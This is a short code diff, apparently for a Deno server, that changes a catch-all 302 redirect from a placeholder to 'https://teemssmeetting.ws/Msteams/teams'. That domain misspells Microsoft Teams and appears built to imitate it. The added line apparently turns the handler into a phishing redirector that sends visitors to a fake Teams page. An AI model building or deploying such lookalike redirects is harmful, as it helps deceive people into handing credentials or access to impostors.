@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https:/", // Replace this with your actual link
+      Location: "https://teemssmeetting.ws/Msteams/teams", // Replace this with your actual link
     },
   });
 });
